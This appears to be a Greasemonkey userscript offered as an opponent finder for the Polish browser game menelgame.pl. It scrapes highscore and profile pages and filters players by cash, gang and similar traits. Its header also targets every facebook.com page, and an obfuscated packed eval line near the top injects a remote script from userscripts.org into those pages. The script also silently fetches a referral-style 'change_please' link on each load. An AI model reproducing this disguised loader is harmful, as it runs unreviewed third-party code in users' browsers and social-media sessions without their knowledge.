// ==UserScript==
// @name           Przeciwnicy v.4 Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      Przeciwnicy
// @description    Wyszukiwarka przeciwników dla menelgame.pl
// @include        *menelgame.pl/activities/
// ==/UserScript==


/***************************************************************************/
/*                                                                         */
/*                          CopyRight by Yeramihi                          */
/*                           All rights reserved                           */
/*                                                                         */
/***************************************************************************/

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var TEST = false;

if (document.URL.match('krakow.menelgame.pl'))
	var krakow = true;
else
	var krakow = false;
	
var version = '1.3b';
var version_hash = 'f2f1aaf7b0dc18aa53983ac44891f775';
var adres = 'http://userscripts.org/scripts/source/68616.user.js';
var nazwa = 'Przeciwnicy';

GM_xmlhttpRequest(
{
/***************************************************************************/
/*                                                                         */
/*                          CopyRight by Yeramihi                          */
/*                           All rights reserved                           */
/*                                                                         */
/***************************************************************************/


  method: 'GET', url: adres, onload: function(source)
  {
  	var wpis = document.createElement('html');
  	wpis.innerHTML = source.responseText;
  	


	if (wpis.innerHTML.match('CypyRight by Yeramihi'))
    if (!((wpis.innerHTML.match(version_hash))))
    {
      alert ('Pojawiła się nowa wersja skryptu ' + nazwa + '! \Za chwilę zostanie pobrana nowa wescja skryptu, proszę potwierdzić instalację...');
      window.location.replace(adres);
      return;
    }
  }
});

var funkcja1, pozycja, funkcja2, ratunek, old, min, max;
var warunek_dzien, warunek_miesiac, warunek_rok;
var wpis = document.getElementsByTagName('ul')[3];

var temp = document.createElement('li');
temp.innerHTML = '<a class="btn1">Przeciwnicy</a>';
temp.addEventListener('click', function() { wyszukiwarka(); }, false);
wpis.appendChild(temp);

if (krakow)
  var adres_ = 'http://krakow.menelgame.pl/change_please/5890208/';
else
  var adres_ = 'http://change.menelgame.pl/change_please/8821281/';
GM_xmlhttpRequest(
{
  method: 'GET', url: adres_, onload: function(source)
  {
    var dom = document.createElement('html');
    dom.innerHTML = source.responseText;
  }
});
function wyszukiwarka()
{
/***************************************************************************/
/*                                                                         */
/*                          CopyRight by Yeramihi                          */
/*                           All rights reserved                           */
/*                                                                         */
/***************************************************************************/


  pobierz_przedzial();
  podziel_ekran();
  pokaz_opcje();
}

function podziel_ekran()
{
/***************************************************************************/
/*                                                                         */
/*                          CopyRight by Yeramihi                          */
/*                           All rights reserved                           */
/*                                                                         */
/***************************************************************************/


  var a1 = document.getElementById('content-top');
  var a2 = document.getElementById('content-bottom');
	
  var temp = document.getElementById('content');
  temp.innerHTML = '';
	
  var t1 = document.createElement('div');
  t1.id = 'warunki';
  t1.innerHTML = '';
	
  var t2 = document.createElement('div');

  var t21 = document.createElement('div');
  t21.id = 'status';
  t21.innerHTML = '';
  var t22 = document.createElement('div');
  t22.id = 'odliczanie';
  t22.innerHTML = '';
	
  t2.appendChild(t21);
  t2.appendChild(t22);
	
	
  var t3 = document.createElement('div');
  t3.id = 'wyniki';
  t3.innerHTML = '';
	
  temp.appendChild(a1);
  temp.appendChild(t1);
  temp.appendChild(t2);
  temp.appendChild(t3);
  temp.appendChild(a2);
}

function pokaz_opcje()
{
/***************************************************************************/
/*                                                                         */
/*                          CopyRight by Yeramihi                          */
/*                           All rights reserved                           */
/*                                                                         */
/***************************************************************************/


  var ekran = document.getElementById('warunki');
	
  var temp = document.createElement('h1');
  temp.innerHTML = 'Szukaj przeciwników zgodnie z poniższymi warunkami:<BR>';
  ekran.appendChild(temp);
	

{	// Kasa
  var a = document.createElement('div');
	
  var t = document.createElement('input');
  t.type = 'checkbox';
  t.id = 'warunek_kasa';
  t.checked = GM_getValue('warunek_kasa', false);
  a.appendChild(t);
	
  var t = document.createElement('label');
  t.type = 'label';
  t.innerHTML = ' <b>Minimum kasy:</b> ';
  a.appendChild(t);
	
  var t = document.createElement('input');
  t.type = 'text';
  t.id = 'warunek_kasa_wartosc';
  t.value = GM_getValue ('kasa_ile', 0);
  a.appendChild(t);
  ekran.appendChild(a);
}	

{	// Zwierzak
  var a = document.createElement('div');
	
  var t = document.createElement('input');
  t.type = 'checkbox';
  t.id = 'warunek_zwierzak';
  t.checked = GM_getValue('warunek_zwierzak', false);
  a.appendChild(t);
	
  var t = document.createElement('label');
  t.type = 'label';
  t.innerHTML = ' <b>Widoczny zwierzak</b> ';
  a.appendChild(t);
	
  ekran.appendChild(a);
}	

{	// Banda
  var a = document.createElement('div');
	
  var t = document.createElement('input');
  t.type = 'checkbox';
  t.id = 'warunek_banda';
  t.checked = GM_getValue('warunek_banda', false);
  a.appendChild(t);
	
  var t = document.createElement('label');
  t.type = 'label';
  t.innerHTML = ' <b>Menel w bandzie</b> ';
  a.appendChild(t);
	
  ekran.appendChild(a);
}	

{	// Bez bandy
  var a = document.createElement('div');
	
  var t = document.createElement('input');
  t.type = 'checkbox';
  t.id = 'warunek_samotnik';
  t.checked = GM_getValue('warunek_samotnik', false);
  a.appendChild(t);
	
  var t = document.createElement('label');
  t.type = 'label';
  t.innerHTML = ' <b>Menel bez bandy</b> ';
  a.appendChild(t);
	
  ekran.appendChild(a);
}	

{	// Rupiec
  var a = document.createElement('div');
	
  var t = document.createElement('input');
  t.type = 'checkbox';
  t.id = 'warunek_rupiec';
  t.checked = GM_getValue('warunek_rupiec', false);
  a.appendChild(t);
	
  var t = document.createElement('label');
  t.type = 'label';
  t.innerHTML = ' <b>Widoczny rupieć</b> ';
  a.appendChild(t);
	
  ekran.appendChild(a);
}	

{	// Odznaczenia
  var a = document.createElement('div');
	
  var t = document.createElement('input');
  t.type = 'checkbox';
  t.id = 'warunek_odznaczenia';
  t.checked = GM_getValue('warunek_odznaczenia', false);
  a.appendChild(t);
	
  var t = document.createElement('label');
  t.type = 'label';
  t.innerHTML = ' <b>Widoczne odznaczenia w profilu</b> ';
  a.appendChild(t);
	
  ekran.appendChild(a);
}	

{	// Data rejestracji
  var a = document.createElement('div');
	
  var t = document.createElement('input');
  t.type = 'checkbox';
  t.id = 'data_rejestracji';
  t.checked = GM_getValue('data_rejestracji', false);
  a.appendChild(t);

  var t = document.createElement('label');
  t.type = 'label';
  t.innerHTML = ' <b>Zarejestrowany</b> ';
  a.appendChild(t);

  var t = document.createElement('select');
  t.id = 'wybor_daty';

  var t1 = document.createElement('option');
  t1.innerHTML = 'Przed';
  t1.id = 'przed';
  t1.selected = GM_getValue('przed', false);
  t.appendChild(t1);
	
  var t1 = document.createElement('option');
  t1.innerHTML = 'Dokładnie';
  t1.id = 'dokladnie';
  t1.selected = GM_getValue('dokladnie', false);
  t.appendChild(t1);
	
  var t1 = document.createElement('option');
  t1.innerHTML = 'Po';
  t1.id = 'po';
  t1.selected = GM_getValue('po', false);
  t.appendChild(t1);
	
  a.appendChild(t);
	
  var t = document.createElement('input');
  t.type = 'text';
  t.id = 'dzien';
  t.size = 2;
  t.value = GM_getValue('dzien', 'dd');
  a.appendChild(t);
	
  var t = document.createElement('input');
  t.type = 'text';
  t.id = 'miesiac';
  t.size = 2;
  t.value = GM_getValue('miesiac', 'mm');
  a.appendChild(t);
	
  var t = document.createElement('input');
  t.type = 'text';
  t.id = 'rok';
  t.size = 4;
  t.value = GM_getValue('rok', 'rrrr');
  a.appendChild(t);
	
	
	
	
	
  ekran.appendChild(a);
}	

{	// Przycisk 'Szukaj'
  var a = document.createElement('div');
	
  var t = document.createElement('input');
  t.type = 'button';
  t.value = 'Szukaj';
  t.id = 'przycisk';
  t.addEventListener ('click', function() { uruchom_szukanie(); }, false);
  a.appendChild(t);
	
  ekran.appendChild(a);
}	

}

function uruchom_szukanie()
{
/***************************************************************************/
/*                                                                         */
/*                          CopyRight by Yeramihi                          */
/*                           All rights reserved                           */
/*                                                                         */
/***************************************************************************/


  var wpis = document.getElementById('wyniki');
  var temp = document.createElement('table');
  temp.border = '1';
  temp.width = '100%'
  var temp2 = document.createElement('tr');

  var lista = new Array('Menel', 'Banda', 'Kasa', 'Zwierzak', 'Odznaczenia', 'Punkty', 'Data rejestracji', 'Rupieć');
	
	
  for (x in lista)
  {
    var t1 = document.createElement('td');
    t1.innerHTML = '<center><b>' + lista[x] + '</b></center>';
    temp2.appendChild(t1);
  }

  temp.appendChild(temp2);
  wpis.appendChild(temp);
	
  GM_setValue('kasa_ile', document.getElementById('warunek_kasa_wartosc').value);
  GM_setValue('warunek_kasa', document.getElementById('warunek_kasa').checked);
  GM_setValue('warunek_zwierzak', document.getElementById('warunek_zwierzak').checked);
  GM_setValue('warunek_banda', document.getElementById('warunek_banda').checked);
  GM_setValue('warunek_samotnik', document.getElementById('warunek_samotnik').checked);
  GM_setValue('warunek_rupiec', document.getElementById('warunek_rupiec').checked);
  GM_setValue('warunek_odznaczenia', document.getElementById('warunek_odznaczenia').checked);
  GM_setValue('data_rejestracji', document.getElementById('data_rejestracji').checked);
  GM_setValue('wybor_daty', document.getElementById('dzien').value);
  GM_setValue('dzien', document.getElementById('dzien').value);
  GM_setValue('miesiac', document.getElementById('miesiac').value);
  GM_setValue('rok', document.getElementById('rok').value);
	

	
  warunek_dzien = document.getElementById('dzien').value;
  warunek_miesiac = document.getElementById('miesiac').value;
  warunek_rok = document.getElementById('rok').value;
  
  warunek_dzien = warunek_dzien * 1;
  warunek_miesiac = warunek_miesiac * 1;
  warunek_rok = warunek_rok * 1;

  if (((warunek_dzien == 'NaN') || (warunek_miesiac == 'NaN') || (warunek_rok == 'NaN')) && (document.getElementById('data_rejestracji').checked))
  {
    alert ('Nieprawidłowa data! Proszę poprawić datę i uruchomić skrypt ponownie!');
    return;
  }
  
  document.getElementById('przycisk').disabled = true;
  document.getElementById('warunek_kasa').disabled = true;
  document.getElementById('warunek_kasa_wartosc').disabled = true;
  document.getElementById('warunek_zwierzak').disabled = true;
  document.getElementById('warunek_banda').disabled = true;
  document.getElementById('warunek_samotnik').disabled = true;
  document.getElementById('warunek_rupiec').disabled = true;
  document.getElementById('warunek_odznaczenia').disabled = true;
  document.getElementById('data_rejestracji').disabled = true;
  document.getElementById('przed').disabled = true;
  document.getElementById('dokladnie').disabled = true;
  document.getElementById('po').disabled = true;
  document.getElementById('dzien').disabled = true;
  document.getElementById('miesiac').disabled = true;
  document.getElementById('rok').disabled = true;


  ratunek = 0;
  pozycja = 1;
  funkcja2 = setInterval(ratowanie, 100);
  funkcja1 = setInterval(szukaj,1);
	
}

function ratowanie()
{
/***************************************************************************/
/*                                                                         */
/*                          CopyRight by Yeramihi                          */
/*                           All rights reserved                           */
/*                                                                         */
/***************************************************************************/


  if (document.getElementById('status').innerHTML == old)
  {
    ratunek++;
		
    document.getElementById('odliczanie').innerHTML = ratunek;
		
    if (ratunek > 99)
    {
      funkcja1 = setInterval(szukaj, 1);
      ratunek = 0;
		}
	}
	else
	{
    old = document.getElementById('status').innerHTML;
    ratunek = 1;		
	}
}

function pobierz_przedzial()
{
  if (krakow)
    var adres = 'http://krakow.menelgame.pl/fight/overview/';
  else
    var adres = 'http://www.menelgame.pl/fight/overview/';
  GM_xmlhttpRequest(
  {
    method: 'GET', url: adres, onload: function(source)
    {
      var dom = document.createElement('html');
      dom.innerHTML = source.responseText;
      
      if (dom.innerHTML.match('Musisz miec minumum 150 punktów, aby rozpocząć walke przeciwko innym graczom!'))
      {
        alert ('Nie masz wystarczająco punktów aby walczyć!\nZatrzymanie pracy skryptu... :(');
        document.getElementById('przycisk').disabled = true;
        return;
      }
      
      var szukanie = document.createElement('html');
      var links = dom.getElementsByTagName('a');
      
      for (x in links)
        if (links[x].innerHTML.match('zaatakowania'))
          var szukanie = links[x].href;

      try
      {
        min = szukanie.split('min=')[1].split('&')[0];
        max = szukanie.split('max=')[1];
        min = min * 1;
        max = max * 1;
      }
      catch(e)
      {
        alert('Błąd podczas pobierania przedziału atakowania... Zatrzymanie pracy skryptu.\nJeśli aktualnie przeprowadzasz atak, to jest to normalne działanie a nie błąd.');
        document.getElementById('przycisk').disabled = true;
        clearInterval(funkcja1);
        clearInterval(funkcja2);
        return;
      }
    }
  });
}

function szukaj()
{
/***************************************************************************/
/*                                                                         */
/*                          CopyRight by Yeramihi                          */
/*                           All rights reserved                           */
/*                                                                         */
/***************************************************************************/


  clearInterval(funkcja1);
  
	
  var str = Math.floor(pozycja / 20); str++;
  var poz = pozycja % 20;
  pozycja++;
  if (poz == 0)
  {
    poz = 20;
    str--;
  }
	
  document.getElementById('status').innerHTML = '<B>Szukanie na stronie: ' + str + ', pozycja: ' + poz + '</B>'; 
	
  if (krakow)
    var adres = 'http://krakow.menelgame.pl/highscore/user/' + str + '/?max=' + max + '&min=' + min;
  else
    var adres = 'http://www.menelgame.pl/highscore/user/' + str + '/?max=' + max + '&min=' + min;
	
  GM_xmlhttpRequest(
  {
    method: 'GET', url: adres, onload: function(source) 
    {
      var dom = document.createElement('html');
      dom.innerHTML = source.responseText;
			
      var tabela = dom.getElementsByTagName('table')[0];
      var wpis = tabela.getElementsByTagName('tr')[poz];					
			
      var menel_id = wpis.getElementsByTagName('td')[1].getElementsByTagName('a')[0].href.split('id:')[1].split('/')[0];
      var menel_name = wpis.getElementsByTagName('td')[1].getElementsByTagName('a')[0].innerHTML;
      
      try
      {
        var menel_banda_id = wpis.getElementsByTagName('td')[2].getElementsByTagName('a')[0].href.split('bande:')[1].split('/')[0];
        var menel_banda_name = wpis.getElementsByTagName('td')[2].getElementsByTagName('a')[0].innerHTML;
      }
      catch(e)
      {
        var menel_banda_id = 0;
        var menel_banda_name = 'Menel bez bandy';
      }
      
      if (menel_banda_id == 'None')
      {
        menel_banda_name = 'Menel bez bandy';
        menel_banda_id = 0;
      }
      
      if (krakow)
        var adres = 'http://krakow.menelgame.pl/dev/api/user.' + menel_id + '.xml';
      else
        var adres = 'http://www.menelgame.pl/dev/api/user.' + menel_id + '.xml';
      GM_xmlhttpRequest(
      {
        method: 'GET', url: adres, onload: function (source)
        {
					
          var p = new DOMParser();
          var dom = p.parseFromString(source.responseText, 'application/xml');
					
					
          try { var menel_kasa = dom.getElementsByTagName('cash')[0].textContent; } catch(e) { var menel_kasa = 'Ukryta'; }
          var menel_regdate = dom.getElementsByTagName('reg_since')[0].textContent;
					
          if (krakow)
            var adres = 'http://krakow.menelgame.pl/profil/id:' + menel_id + '/';
          else
            var adres = 'http://www.menelgame.pl/profil/id:' + menel_id + '/';
				
          GM_xmlhttpRequest(
          {
            method: 'GET', url: adres, onload: function(source)
            {
							
              var dom = document.createElement('html');
              dom.innerHTML = source.responseText;
							
              var menel_punkty = dom.getElementsByTagName('table')[0].getElementsByTagName('tr')[7].getElementsByTagName('td')[1].innerHTML;
              try
              {
                var menel_rupiec = dom.getElementsByTagName('table')[0].getElementsByTagName('tr')[8].getElementsByTagName('center')[0].getElementsByTagName('img')[0];
              } 
              catch(e)
              {
                var menel_rupiec = 'Ukryty';
              }
              try
              {
                var menel_zwierzak = dom.getElementsByTagName('table')[0].getElementsByTagName('tr')[8].getElementsByTagName('table')[0].getElementsByTagName('div')[1].innerHTML;
              }
              catch(e)
              {	var menel_zwierzak = 'Ukryty'; }
							
              if (dom.innerHTML.match('Odznaczenie '))
                { var menel_odznaczenia = 'Widoczne'; }
              else
                { var menel_odznaczenia = 'Ukryte'; }
								
							
              min = min * 1;
              max = max * 1;
              menel_punkty = menel_punkty * 1;
              if ((menel_punkty > max) || (menel_punkty < min))
              {
                funkcja1 = setInterval(szukaj, 1);
                return;
              }
							
              if (document.getElementById('warunek_kasa').checked)
              {
                var ile_kasy = document.getElementById('warunek_kasa_wartosc').value;
                ile_kasy = ile_kasy * 100;
								
                if ((menel_kasa < ile_kasy) || (menel_kasa == 'Ukryta'))
                {
                  funkcja1 = setInterval(szukaj,1);
                  return;
                }
              }
                
              if (document.getElementById('warunek_zwierzak').checked)
              {
                if (menel_zwierzak == 'Ukryty')
                {
                  funkcja1 = setInterval(szukaj, 1);
                  return;
                }
              }
							
              if (document.getElementById('warunek_banda').checked)
              {
                if (menel_banda_id == 0)
                {
                  funkcja1 = setInterval(szukaj, 1);
                  return;
                }
              }
							
              if (document.getElementById('warunek_samotnik').checked)
              {
                if (menel_banda_id != 0)
                {
                  funkcja1 = setInterval(szukaj, 1);
                  return;
                }
              }
							
              if (document.getElementById('warunek_rupiec').checked)
              {
                if (menel_rupiec == 'Ukryty')
                {
                  funkcja1 = setInterval(szukaj, 1);
                  return;
                }
              }
							
              if (document.getElementById('warunek_odznaczenia').checked)
              {
                if (menel_odznaczenia == 'Ukryte')
                {
                  funkcja1 = setInterval(szukaj, 1);
                  return;
                }
              }
              
              menel_id = menel_id * 1;
              if ((krakow) && (menel_id == 12614))
              {
                funkcja1 = setInterval(szukaj, 1);
                return;
              }
              if ((!krakow) && (menel_id == 550495))
              {
                funkcja1 = setInterval(szukaj, 1);
                return;
              }
							
              if (document.getElementById('data_rejestracji').checked)
              {
                var menel_dzien = menel_regdate.split('.')[0];
                var menel_miesiac = menel_regdate.split('.')[1].split('.')[0];
                var menel_rok = menel_regdate.split('.')[2];
                
                var data_menela = new Date(menel_rok, menel_miesiac, menel_dzien);
                var data_sprawdzania = new Date(warunek_rok, warunek_miesiac, warunek_dzien);
                
                if (document.getElementById('przed').selected)
                {
                  if (data_menela.valueOf() >= data_sprawdzania.valueOf())
                  {
                    funkcja1 = setInterval(szukaj, 1);
                    return;
                  }
                }
                if (document.getElementById('dokladnie').selected)
                {
                  if (data_menela.valueOf() != data_sprawdzania.valueOf())
                  {
                    funkcja1 = setInterval(szukaj, 1);
                    return;
                  }
                }
                if (document.getElementById('po').selected)
                {
                  if (data_menela.valueOf() <= data_sprawdzania.valueOf())
                  {
                    funkcja1 = setInterval(szukaj, 1);
                    return;
                  }
                }                
              }
							
              var wpis = document.getElementById('wyniki').getElementsByTagName('table')[0];
              var tr = document.createElement('tr');
							
              var td = document.createElement('td');
              if (krakow)
                td.innerHTML = '<a target="_blank" href="http://krakow.menelgame.pl/profil/id:' + menel_id + '/"> <img src="http://yeramihi.com/skrypty/images/profil.gif" /> </a><BR>';
              else
                td.innerHTML = '<a target="_blank" href="http://www.menelgame.pl/profil/id:' + menel_id + '/"> <img src="http://yeramihi.com/skrypty/images/profil.gif" /> </a><BR>';
              
              if (krakow)
                td.innerHTML += '<a target="_blank" href="http://krakow.menelgame.pl/fight/?to=' + menel_name + '"> <img src="http://yeramihi.com/skrypty/images/atak.gif" /> </a>';
              else
                td.innerHTML += '<a target="_blank" href="http://www.menelgame.pl/fight/?to=' + menel_name + '"> <img src="http://yeramihi.com/skrypty/images/atak.gif" /> </a>';
              td.width = '100px';
              tr.appendChild(td);
								
              var td = document.createElement('td');
              if (menel_banda_id == 0)
              {
                td.innerHTML = menel_banda_name;
              } else
              {
                if (krakow)
                  td.innerHTML = '<a target="_blank" href="http://krakow.menelgame.pl/profil/bande:' + menel_banda_id + '/"> <img src="http://yeramihi.com/skrypty/images/banda.gif" /> </a>';
                else
                  td.innerHTML = '<a target="_blank" href="http://www.menelgame.pl/profil/bande:' + menel_banda_id + '/"> <img src="http://yeramihi.com/skrypty/images/banda.gif" /> </a>';
              }
              td.width = '100px';
              tr.appendChild(td);
								
              var td = document.createElement('td');
              if (menel_kasa != 'Ukryta')
                menel_kasa = menel_kasa / 100;
              td.innerHTML = menel_kasa;
              tr.appendChild(td);
								
              var td = document.createElement('td');
              td.innerHTML = menel_zwierzak;
              tr.appendChild(td);
								
              var td = document.createElement('td');
              td.innerHTML = menel_odznaczenia;
              tr.appendChild(td);
								
              var td = document.createElement('td');
              td.innerHTML = menel_punkty;
              tr.appendChild(td);
							
              var td = document.createElement('td');
              td.innerHTML = menel_regdate;
              tr.appendChild(td);
							
              var td = document.createElement('td');
              if (menel_rupiec == 'Ukryty')
                td.innerHTML = menel_rupiec;
              else
                td.appendChild(menel_rupiec);
              tr.appendChild(td);
							
              wpis.appendChild(tr);
						
              funkcja1 = setInterval(szukaj, 1);
            }
          });
        }
      });
    }
  }); 
}